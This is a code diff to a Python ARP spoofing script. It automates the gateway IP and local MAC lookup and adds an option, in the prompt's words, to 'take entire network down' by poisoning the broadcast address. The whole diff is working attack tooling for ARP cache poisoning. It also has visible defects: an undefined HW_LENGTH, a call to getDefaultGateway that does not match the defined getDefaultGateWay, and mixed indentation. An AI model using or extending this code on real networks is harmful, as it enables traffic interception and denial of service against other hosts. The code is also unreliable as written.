@@ -9,7 +9,7 @@ import re
 IPV4_LENGTH = 13
 bcast_string = 'Bcast:'
 #default_gateway =
-def findBCastAddress():
+def getBCastAddress():
     if platform.startswith('linux'):
         output = subprocess.Popen('ifconfig', stdout=subprocess.PIPE).communicate()[0]
         start_ip = output.index(bcast_string)
@@ -18,7 +18,7 @@ def findBCastAddress():
         bcast_ip_address = bcast_ip_address.strip()
         return bcast_ip_address
 
-def findDefaultGateWay():
+def getDefaultGateWay():
     if platform.startswith('linux'):
         output = subprocess.Popen('route', stdout=subprocess.PIPE).communicate()[0]
         pattern = re.compile('default\s+')
@@ -30,12 +30,25 @@ def findDefaultGateWay():
         print('Default gateway is: '+default_gateway)
         return default_gateway
 
+def getCurrentMACAddress():
+	if platform.startswith('linux'):
+		output = subprocess.Popen(['ifconfig','-a'], stdout=subprocess.PIPE).communicate()[0]
+		pattern = re.compile('HWaddr\s+')
+		mat_object = pattern.search(output)
+		index = output.index(mat_object.group(0))
+		length = len(mat_object.group(0))
+		currentMACAddress = output[index+length:index+length+HW_LENGTH]
+		print('current Mac address is: '+currentMACAddress)
+		return currentMACAddress
+
 def spoof():
     #findBCastAddress()
     #findDefaultGateWay()
-    dst_ip = raw_input('Enter the machine IP you want to spoof: ')
-    src_ip = raw_input('Enter the default gateway IP: ')
-    src_hw = raw_input('Enter the source MAC address: ')
+    dst_ip = raw_input('Enter the machine IP you want to spoof or enter entire to take entire network down: ')
+    if dst_ip == 'entire':
+        dst_ip = getBCastAddress()
+    src_ip = getDefaultGateway()
+    src_hw = getCurrentMACAddress()
     arp_packet = ARP()
     arp_packet.psrc = src_ip
     arp_packet.hwsrc = src_hw
